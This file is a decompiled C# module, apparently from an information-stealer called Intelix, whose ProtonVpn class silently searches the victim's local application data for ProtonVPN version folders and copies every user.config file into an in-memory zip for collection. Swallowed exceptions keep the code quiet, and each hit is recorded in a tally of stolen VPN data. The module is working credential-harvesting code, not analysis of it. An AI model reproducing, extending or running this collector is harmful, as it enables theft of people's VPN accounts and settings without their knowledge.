using System;
using System.IO;
using System.Threading.Tasks;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x02000011 RID: 17
	public class ProtonVpn : ITarget
	{
		// Token: 0x06000035 RID: 53 RVA: 0x0000315C File Offset: 0x0000135C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "ProtonVPN";
				Parallel.ForEach<string>(Directory.GetDirectories(text), delegate(string dir)
				{
					try
					{
						bool flag2 = dir.Contains("ProtonVPN_");
						if (flag2)
						{
							Parallel.ForEach<string>(Directory.GetDirectories(dir), delegate(string version)
							{
								try
								{
									string path = Path.Combine(version, "user.config");
									bool flag3 = File.Exists(path);
									if (flag3)
									{
										string entryPath = "ProtonVpn\\" + Path.GetFileName(version) + "\\user.config";
										zip.AddFile(entryPath, File.ReadAllBytes(path));
									}
								}
								catch
								{
								}
							});
						}
					}
					catch
					{
					}
				});
				counterApplications.Files.Add(text + " => ProtonVpn");
				counterApplications.Files.Add("ProtonVpn\\");
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
